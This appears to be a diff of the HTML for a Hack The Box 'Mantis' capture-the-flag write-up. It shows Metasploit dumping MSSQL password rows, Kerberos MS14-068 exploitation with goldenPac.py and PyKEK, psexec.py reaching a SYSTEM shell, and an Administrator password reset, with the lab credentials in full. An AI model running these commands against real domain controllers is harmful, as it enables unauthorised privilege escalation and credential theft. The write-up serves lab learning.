-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ msfconsole
-msf &gt; use auxiliary/admin/mssql/mssql_findandsampledata
-msf auxiliary(mssql_findandsampledata) &gt; set USERNAME admin
-msf auxiliary(mssql_findandsampledata) &gt; set PASSWORD m$$ql_S@_P@ssW0rd!
-msf auxiliary(mssql_findandsampledata) &gt; set SAMPLE_SIZE 10
-
-Name                Current Setting    Required Description
-----                ---------------    -------- -----------
-KEYWORDS            passw|credit|card  yes      Keywords to search for
-PASSWORD            m$$ql_S@_P@ssW0rd! no       The password for the specified username
-RHOSTS              10.10.10.52        yes      The target address range or CIDR identifier
-RPORT               1433               yes      The target port (TCP)
-SAMPLE_SIZE         10                 yes      Number of rows to sample
-TDSENCRYPTION       false              yes      Use TLS/SSL for TDS data &#34;Force Encryption&#34;
-THREADS             1                  yes      The number of concurrent threads
-USERNAME            admin              no       The username to authenticate as
-USE_WINDOWS_AUTHENT false              yes      Use windows authentification (requires DOMAIN option set)
-
-msf auxiliary(mssql_findandsampledata) &gt; exploit
-
-[*] 10.10.10.52:1433 - Attempting to connect to the SQL Server at 10.10.10.52:1433...
-[*] 10.10.10.52:1433 - Successfully connected to 10.10.10.52:1433
-[*] 10.10.10.52:1433 - Attempting to retrieve data ...
-[*] 10.10.10.52:1433 - MANTIS\\SQLEXPRESS, orcharddb, ..., Password, nvarchar, AL1337E2D6YHm0iIysVzG8LA76Oozg
-[*] 10.10.10.52:1433 - MANTIS\\SQLEXPRESS, orcharddb, ..., Password, nvarchar, J@m3s_P@ssW0rd!
-[*] 10.10.10.52:1433 - MANTIS\\SQLEXPRESS, orcharddb, ..., PasswordSalt, nvarchar, NA
-[*] 10.10.10.52:1433 - MANTIS\\SQLEXPRESS, orcharddb, ..., PasswordSalt, nvarchar, UBwWF1CQCsaGc/P7jIR/kg==
-[*] 10.10.10.52:1433 - Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed</code></pre></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>msfconsole
+<span class="go">msf &gt; use auxiliary/admin/mssql/mssql_findandsampledata
+</span><span class="go">msf auxiliary(mssql_findandsampledata) &gt; set USERNAME admin
+</span><span class="go">msf auxiliary(mssql_findandsampledata) &gt; set PASSWORD m$$ql_S@_P@ssW0rd!
+</span><span class="go">msf auxiliary(mssql_findandsampledata) &gt; set SAMPLE_SIZE 10
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Name                Current Setting    Required Description
+</span><span class="go">----                ---------------    -------- -----------
+</span><span class="go">KEYWORDS            passw|credit|card  yes      Keywords to search for
+</span><span class="go">PASSWORD            m$$ql_S@_P@ssW0rd! no       The password for the specified username
+</span><span class="go">RHOSTS              10.10.10.52        yes      The target address range or CIDR identifier
+</span><span class="go">RPORT               1433               yes      The target port (TCP)
+</span><span class="go">SAMPLE_SIZE         10                 yes      Number of rows to sample
+</span><span class="go">TDSENCRYPTION       false              yes      Use TLS/SSL for TDS data &#34;Force Encryption&#34;
+</span><span class="go">THREADS             1                  yes      The number of concurrent threads
+</span><span class="go">USERNAME            admin              no       The username to authenticate as
+</span><span class="go">USE_WINDOWS_AUTHENT false              yes      Use windows authentification (requires DOMAIN option set)
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">msf auxiliary(mssql_findandsampledata) &gt; exploit
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[*] 10.10.10.52:1433 - Attempting to connect to the SQL Server at 10.10.10.52:1433...
+</span><span class="go">[*] 10.10.10.52:1433 - Successfully connected to 10.10.10.52:1433
+</span><span class="go">[*] 10.10.10.52:1433 - Attempting to retrieve data ...
+</span><span class="go">[*] 10.10.10.52:1433 - MANTIS\\SQLEXPRESS, orcharddb, ..., Password, nvarchar, AL1337E2D6YHm0iIysVzG8LA76Oozg
+</span><span class="go">[*] 10.10.10.52:1433 - MANTIS\\SQLEXPRESS, orcharddb, ..., Password, nvarchar, J@m3s_P@ssW0rd!
+</span><span class="go">[*] 10.10.10.52:1433 - MANTIS\\SQLEXPRESS, orcharddb, ..., PasswordSalt, nvarchar, NA
+</span><span class="go">[*] 10.10.10.52:1433 - MANTIS\\SQLEXPRESS, orcharddb, ..., PasswordSalt, nvarchar, UBwWF1CQCsaGc/P7jIR/kg==
+</span><span class="go">[*] 10.10.10.52:1433 - Scanned 1 of 1 hosts (100% complete)
+</span><span class="go">[*] Auxiliary module execution completed
+</span></code></pre></div></div>
 
 <h1 id="exploiting-kerberos">Exploiting Kerberos</h1>
 
@@ -662,182 +670,195 @@ Let&rsquo;s use them to exploit Kerberos:</p>
 <h2 id="using-impacket-goldenpac-py">Using Impacket (goldenPac.py)</h2>
 
 <p>Add these lines to /etc/hosts:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">10.10.10.52 mantis.htb.local
-10.10.10.52 htb.local</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">10.10.10.52 mantis.htb.local
+</span><span class="go">10.10.10.52 htb.local
+</span></code></pre></div></div></p>
 
 <p>Now let&rsquo;s run goldenPac.py:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ goldenPac.py htb.local/james:J@m3s_P@ssW0rd\!@mantis.htb.local
-
-Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
-
-[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
-[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
-[*] Attacking domain controller mantis.htb.local
-[*] mantis.htb.local found vulnerable!
-[*] Requesting shares on mantis.htb.local.....
-[*] Found writable share ADMIN$
-[*] Uploading file hgjtJStu.exe
-[*] Opening SVCManager on mantis.htb.local.....
-[*] Creating service rQic on mantis.htb.local.....
-[*] Starting service rQic.....
-[!] Press help for extra shell commands
-Microsoft Windows [Version 6.1.7601]
-Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
-
-C:\Windows\system32&gt; whoami
-nt authority\system</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>goldenPac.py htb.local/james:J@m3s_P@ssW0rd<span class="se">\!</span>@mantis.htb.local
+<span class="err">
+</span><span class="err"></span><span class="go">Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
+</span><span class="go">[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
+</span><span class="go">[*] Attacking domain controller mantis.htb.local
+</span><span class="go">[*] mantis.htb.local found vulnerable!
+</span><span class="go">[*] Requesting shares on mantis.htb.local.....
+</span><span class="go">[*] Found writable share ADMIN$
+</span><span class="go">[*] Uploading file hgjtJStu.exe
+</span><span class="go">[*] Opening SVCManager on mantis.htb.local.....
+</span><span class="go">[*] Creating service rQic on mantis.htb.local.....
+</span><span class="go">[*] Starting service rQic.....
+</span><span class="go">[!] Press help for extra shell commands
+</span><span class="go">Microsoft Windows [Version 6.1.7601]
+</span><span class="go">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">C:\Windows\system32&gt; whoami
+</span><span class="go">nt authority\system
+</span></code></pre></div></div></p>
 
 <h2 id="using-pykek-i-e-python-kerberos-exploitation-kit-ms14-068-py">Using PyKEK i.e. Python Kerberos Exploitation Kit (ms14-068.py)</h2>
 
 <p>Add these lines to /etc/hosts:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">10.10.10.52 mantis.htb.local
-10.10.10.52 htb.local</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">10.10.10.52 mantis.htb.local
+</span><span class="go">10.10.10.52 htb.local
+</span></code></pre></div></div></p>
 
 <p>Add this line to /etc/resolv.conf:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">nameserver 10.10.10.52</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">nameserver 10.10.10.52
+</span></code></pre></div></div></p>
 
 <p>Get USER_SID using rpcclient:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ rpcclient -U james 10.10.10.52
-Enter james&#39;s password: J@m3s_P@ssW0rd!
-rpcclient $&gt; lookupnames james
-james S-1-5-21-4220043660-4019079961-2895681657-1103</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>rpcclient -U james 10.10.10.52
+<span class="go">Enter james&#39;s password: J@m3s_P@ssW0rd!
+</span><span class="go">rpcclient $&gt; lookupnames james
+</span><span class="go">james S-1-5-21-4220043660-4019079961-2895681657-1103
+</span></code></pre></div></div></p>
 
 <p>Create the ticket and copy it into the proper location:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ git clone https://github.com/bidord/pykek &amp;&amp; cd pykek
-$ python2 ms14-068.py -u james@htb.local -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis.htb.local
-Password:J@m3s_P@ssW0rd!
-
-$ cp TGT_james@htb.local.ccache /tmp/krb5cc_$(echo $UID)</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>git clone https://github.com/bidord/pykek <span class="o">&amp;&amp;</span> <span class="nb">cd</span> pykek
+<span class="gp">$ </span>python2 ms14-068.py -u james@htb.local -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis.htb.local
+<span class="go">Password:J@m3s_P@ssW0rd!
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="gp">$ </span>cp TGT_james@htb.local.ccache /tmp/krb5cc_<span class="k">$(</span><span class="nb">echo</span> <span class="nv">$UID</span><span class="k">)</span>
+</code></pre></div></div></p>
 
 <p>Connect using smbclient:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ smbclient -k -U james \\\\mantis.htb.local\\C$
-
-OS=[Windows Server 2008 R2 Standard 7601 Service Pack 1] Server=[Windows Server 2008 R2 Standard 6.1]
-smb: \&gt; more \USERS\Administrator\DESKTOP\root.txt
-209dc756ee5c09a9967540fe18d15567</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>smbclient -k -U james <span class="se">\\\\</span>mantis.htb.local<span class="se">\\</span>C$
+<span class="err">
+</span><span class="err"></span><span class="go">OS=[Windows Server 2008 R2 Standard 7601 Service Pack 1] Server=[Windows Server 2008 R2 Standard 6.1]
+</span><span class="go">smb: \&gt; more \USERS\Administrator\DESKTOP\root.txt
+</span><span class="go">209dc756ee5c09a9967540fe18d15567
+</span></code></pre></div></div></p>
 
 <h2 id="a-word-of-advice">A word of advice</h2>
 
 <p>If Kerberos does not work as expected, make sure that you have added the proper lines in /etc/hosts and /etc/resolv.conf (and -of course- check the kerberos configuration files if you use them). Notice that kinit seems to need UPPERCASE letters for the domain in order to work correctly. Compare the following different results:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ kinit -V james@htb.local
-Using default cache: /tmp/krb5cc_1000
-Using principal: james@htb.local
-Password for james@htb.local: J@m3s_P@ssW0rd!
-kinit: KDC reply did not match expectations while getting initial credentials
-
-$ kinit -V james@HTB.LOCAL
-Using default cache: /tmp/krb5cc_1000
-Using principal: james@HTB.LOCAL
-Password for james@HTB.LOCAL: J@m3s_P@ssW0rd!
-Authenticated to Kerberos v5
-BONUS: Exploitation using left behind services</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>kinit -V james@htb.local
+<span class="go">Using default cache: /tmp/krb5cc_1000
+</span><span class="go">Using principal: james@htb.local
+</span><span class="go">Password for james@htb.local: J@m3s_P@ssW0rd!
+</span><span class="go">kinit: KDC reply did not match expectations while getting initial credentials
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="gp">$ </span>kinit -V james@HTB.LOCAL
+<span class="go">Using default cache: /tmp/krb5cc_1000
+</span><span class="go">Using principal: james@HTB.LOCAL
+</span><span class="go">Password for james@HTB.LOCAL: J@m3s_P@ssW0rd!
+</span><span class="go">Authenticated to Kerberos v5
+</span><span class="go">BONUS: Exploitation using left behind services
+</span></code></pre></div></div></p>
 
 <h1 id="look-mom-no-need-for-kerberos-exploit-d">Look Mom! No need for kerberos exploit! :D</h1>
 
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ psexec.py htb.local/james:J@m3s_P@ssW0rd\!@mantis.htb.local
-Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
-
-[*] Trying protocol 445/SMB...
-[*] Requesting shares on mantis.htb.local.....
-[-] share &#39;ADMIN$&#39; is not writable.
-[-] share &#39;C$&#39; is not writable.
-[-] share &#39;NETLOGON&#39; is not writable.
-[-] share &#39;SYSVOL&#39; is not writable.
-[*] Uploading file VdYFkBHZ.exe
-[-] Error uploading file VdYFkBHZ.exe, aborting.....
-[-] Error performing the installation, cleaning up: &#39;NoneType&#39; object has no attribute &#39;split&#39;
-[!] Press help for extra shell commands
-Microsoft Windows [Version 6.1.7601]
-
-Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
-
-C:\Windows\system32&gt;whoami
-nt authority\system</code></pre></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>psexec.py htb.local/james:J@m3s_P@ssW0rd<span class="se">\!</span>@mantis.htb.local
+<span class="go">Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[*] Trying protocol 445/SMB...
+</span><span class="go">[*] Requesting shares on mantis.htb.local.....
+</span><span class="go">[-] share &#39;ADMIN$&#39; is not writable.
+</span><span class="go">[-] share &#39;C$&#39; is not writable.
+</span><span class="go">[-] share &#39;NETLOGON&#39; is not writable.
+</span><span class="go">[-] share &#39;SYSVOL&#39; is not writable.
+</span><span class="go">[*] Uploading file VdYFkBHZ.exe
+</span><span class="go">[-] Error uploading file VdYFkBHZ.exe, aborting.....
+</span><span class="go">[-] Error performing the installation, cleaning up: &#39;NoneType&#39; object has no attribute &#39;split&#39;
+</span><span class="go">[!] Press help for extra shell commands
+</span><span class="go">Microsoft Windows [Version 6.1.7601]
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">C:\Windows\system32&gt;whoami
+</span><span class="go">nt authority\system
+</span></code></pre></div></div>
 
 <p>We got some errors, but it worked! Maybe we have access to a writable share after all&hellip;
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ smbmap.py -u james -p J@m3s_P@ssW0rd\! -H mantis.htb.local
-[+] Finding open SMB ports....
-[+] User SMB session establishd on mantis.htb.local...
-[+] IP: mantis.htb.local:445    Name: mantis.htb.local                                  
-    Disk                                                Permissions
-    ----                                                -----------
-    ADMIN$                                              NO ACCESS
-    C$                                                  NO ACCESS
-    IPC$                                                NO ACCESS
-    NETLOGON                                            READ ONLY
-    SYSVOL                                              READ ONLY</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>smbmap.py -u james -p J@m3s_P@ssW0rd<span class="se">\!</span> -H mantis.htb.local
+<span class="go">[+] Finding open SMB ports....
+</span><span class="go">[+] User SMB session establishd on mantis.htb.local...
+</span><span class="go">[+] IP: mantis.htb.local:445    Name: mantis.htb.local                                  
+</span><span class="go">    Disk                                                Permissions
+</span><span class="go">    ----                                                -----------
+</span><span class="go">    ADMIN$                                              NO ACCESS
+</span><span class="go">    C$                                                  NO ACCESS
+</span><span class="go">    IPC$                                                NO ACCESS
+</span><span class="go">    NETLOGON                                            READ ONLY
+</span><span class="go">    SYSVOL                                              READ ONLY
+</span></code></pre></div></div></p>
 
 <p>No. We don&rsquo;t have access to a writable share. This is very strange. How did we get nt authority\system shell? I decided to open an issue on the github: <a href="https://github.com/CoreSecurity/impacket/issues/346" target="_blank">https://github.com/CoreSecurity/impacket/issues/346</a></p>
 
 <p>It seems that psexec.py is connecting to a previous RemComSvc instance that is still running in the target system. The need for a writeable share is only for copying the RemComSvc Windows Service file. Once it is running, all communication is done through Windows Named Pipes.</p>
 
 <p>I changed the password for the administrator account to make it easier to explore the issue:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">C:\Windows\system32&gt; net user Administrator P@ssw0rd</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">C:\Windows\system32&gt; net user Administrator P@ssw0rd
+</span></code></pre></div></div></p>
 
 <p>We can use Impacket (services.py) to list the services. We look for services named using four random uppercase letters. Moreover, their executable file should be named using eight random mixed case letters and its path should be inside C:\Windows\ :
-<div class="bg-black"><pre><code class="language-console" data-lang="console">services.py htb.local/administrator:P@ssw0rd@mantis.htb.local list
-
-...
-IHXM -                   IHXM -  RUNNING
-...
-TZZW -                   TZZW -  RUNNING
-...
-
-$ services.py htb.local/administrator:P@ssw0rd@mantis.htb.local config -name IHXM
-Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
-
-[*] Trying protocol 445/SMB...
-[*] Querying service config for IHXM
-TYPE              : 16 -  SERVICE_WIN32_OWN_PROCESS  
-START_TYPE        :  2 -  AUTO START
-ERROR_CONTROL     :  0 -  IGNORE
-BINARY_PATH_NAME  : C:\Windows\dZEyLGVN.exe
-LOAD_ORDER_GROUP  : 
-TAG               : 0
-DISPLAY_NAME      : IHXM
-DEPENDENCIES      : /
-
-$ services.py htb.local/administrator:P@ssw0rd@mantis.htb.local config -name TZZW
-Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
-
-[*] Trying protocol 445/SMB...
-[*] Querying service config for TZZW
-TYPE              : 16 -  SERVICE_WIN32_OWN_PROCESS  
-START_TYPE        :  2 -  AUTO START
-ERROR_CONTROL     :  0 -  IGNORE
-BINARY_PATH_NAME  : C:\Windows\EfuIvklz.exe
-LOAD_ORDER_GROUP  : 
-TAG               : 0
-DISPLAY_NAME      : TZZW
-DEPENDENCIES      : /
-SERVICE_START_NAME: LocalSystem</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">services.py htb.local/administrator:P@ssw0rd@mantis.htb.local list
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">...
+</span><span class="go">IHXM -                   IHXM -  RUNNING
+</span><span class="go">...
+</span><span class="go">TZZW -                   TZZW -  RUNNING
+</span><span class="go">...
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="gp">$ </span>services.py htb.local/administrator:P@ssw0rd@mantis.htb.local config -name IHXM
+<span class="go">Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[*] Trying protocol 445/SMB...
+</span><span class="go">[*] Querying service config for IHXM
+</span><span class="go">TYPE              : 16 -  SERVICE_WIN32_OWN_PROCESS  
+</span><span class="go">START_TYPE        :  2 -  AUTO START
+</span><span class="go">ERROR_CONTROL     :  0 -  IGNORE
+</span><span class="go">BINARY_PATH_NAME  : C:\Windows\dZEyLGVN.exe
+</span><span class="go">LOAD_ORDER_GROUP  : 
+</span><span class="go">TAG               : 0
+</span><span class="go">DISPLAY_NAME      : IHXM
+</span><span class="go">DEPENDENCIES      : /
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="gp">$ </span>services.py htb.local/administrator:P@ssw0rd@mantis.htb.local config -name TZZW
+<span class="go">Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[*] Trying protocol 445/SMB...
+</span><span class="go">[*] Querying service config for TZZW
+</span><span class="go">TYPE              : 16 -  SERVICE_WIN32_OWN_PROCESS  
+</span><span class="go">START_TYPE        :  2 -  AUTO START
+</span><span class="go">ERROR_CONTROL     :  0 -  IGNORE
+</span><span class="go">BINARY_PATH_NAME  : C:\Windows\EfuIvklz.exe
+</span><span class="go">LOAD_ORDER_GROUP  : 
+</span><span class="go">TAG               : 0
+</span><span class="go">DISPLAY_NAME      : TZZW
+</span><span class="go">DEPENDENCIES      : /
+</span><span class="go">SERVICE_START_NAME: LocalSystem
+</span></code></pre></div></div></p>
 
 <p>Now, let&rsquo;s try to stop those two services and check if psexec still works as before:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ services.py htb.local/administrator:P@ssw0rd@mantis.htb.local stop -name IHXM
-Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
-
-[*] Trying protocol 445/SMB...
-[*] Stopping service IHXM
-
-$ services.py htb.local/administrator:P@ssw0rd@mantis.htb.local stop -name TZZW
-Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
-
-[*] Trying protocol 445/SMB...
-[*] Stopping service TZZW
-
-$ psexec.py htb.local/james:J@m3s_P@ssW0rd\!@mantis.htb.local
-Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
-
-[*] Trying protocol 445/SMB...
-
-[*] Requesting shares on mantis.htb.local.....
-[-] share &#39;ADMIN$&#39; is not writable.
-[-] share &#39;C$&#39; is not writable.
-[-] share &#39;NETLOGON&#39; is not writable.
-[-] share &#39;SYSVOL&#39; is not writable.
-[*] Uploading file ysSjUyKc.exe
-[-] Error uploading file ysSjUyKc.exe, aborting.....
-[-] Error performing the installation, cleaning up: &#39;NoneType&#39; object has no attribute &#39;split&#39;</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>services.py htb.local/administrator:P@ssw0rd@mantis.htb.local stop -name IHXM
+<span class="go">Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[*] Trying protocol 445/SMB...
+</span><span class="go">[*] Stopping service IHXM
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="gp">$ </span>services.py htb.local/administrator:P@ssw0rd@mantis.htb.local stop -name TZZW
+<span class="go">Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[*] Trying protocol 445/SMB...
+</span><span class="go">[*] Stopping service TZZW
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="gp">$ </span>psexec.py htb.local/james:J@m3s_P@ssW0rd<span class="se">\!</span>@mantis.htb.local
+<span class="go">Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[*] Trying protocol 445/SMB...
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[*] Requesting shares on mantis.htb.local.....
+</span><span class="go">[-] share &#39;ADMIN$&#39; is not writable.
+</span><span class="go">[-] share &#39;C$&#39; is not writable.
+</span><span class="go">[-] share &#39;NETLOGON&#39; is not writable.
+</span><span class="go">[-] share &#39;SYSVOL&#39; is not writable.
+</span><span class="go">[*] Uploading file ysSjUyKc.exe
+</span><span class="go">[-] Error uploading file ysSjUyKc.exe, aborting.....
+</span><span class="go">[-] Error performing the installation, cleaning up: &#39;NoneType&#39; object has no attribute &#39;split&#39;
+</span></code></pre></div></div></p>
 
 <p>Yup, it doesn&rsquo;t work anymore. This confirms that those two services were responsible for the previous behaviour. But how those services were installed on the box in the first place? I don&rsquo;t know. Probably, during the testing phase, some pentester tried to use psexec.py. If -for any reason- the cleaning up phase of the tool failed, it left behind those services.</p>
 
@@ -866,6 +887,506 @@ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
            
            
            
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Sense write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">24 Mar 2018</time>
+      <time lang="el">24 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Querier write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">22 Jun 2019</time>
+      <time lang="el">22 Ιουν 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">13 May 2018</time>
+      <time lang="el">13 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Minion write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">10 Apr 2018</time>
+      <time lang="el">10 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/unattended_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/unattended.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Unattended write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Unattended</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">23 Aug 2019</time>
+      <time lang="el">23 Αυγ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/rold/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
+      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">16 Aug 2015</time>
+      <time lang="el">16 Αυγ 2015</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Tally write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">03 May 2018</time>
+      <time lang="el">03 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
+    <div class="cell">
